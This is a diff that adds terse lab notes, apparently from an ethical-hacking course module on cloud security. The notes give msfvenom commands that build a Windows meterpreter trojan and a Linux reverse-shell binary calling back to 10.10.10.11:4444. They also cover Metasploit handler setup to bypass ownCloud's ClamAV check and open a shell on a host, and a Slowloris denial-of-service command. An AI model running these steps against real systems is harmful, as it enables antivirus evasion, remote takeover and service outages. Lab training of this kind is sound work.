@@ -1,0 +1,29 @@
+Module 19: Cloud Computing
+
+Creating User Accounts and Assigning User Rights in ownCloud
+
+Securing ownCloud from Malicious File uploads using ClamAV
+	In Kali Linux, msfvenom -p windows/meterpreter/reverse_tcp -f exe > /root/Desktop/trojan.exe
+	ownCloud blocks this at upload.
+
+Bypassing ownCloud Antivirus and Hacking the Host using Kali Linux
+	In Kali Linux, msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.11 LPORT=4444 --platform linux -f elf > /root/Desktop/exploit.elf
+	ownCloud upload goes on.
+	msfconsole
+	use multi/handler
+	show options
+	set payload linux/x86/shell/reverse_tcp
+	set LHOST 10.10.10.11
+	set LPORT 4444
+	run
+	In Ubuntu, download exploit.elf
+	chmod -R 755 exploit.elf
+	./exploit.elf
+	In Kali Linux, session is created automatically, if not: sessions -i 1
+	ifconfig, pwd, whoami
+
+Implementing DoS Attack on Linux Cloud Server Using Slowloris Script
+	In Kali Linux, run Wireshark and monitor.
+	chmod 777 Slowloris.pl
+	./Slowloris.pl -dns 10.10.10.9
+	Check Wireshark. Ctrl+C attack.
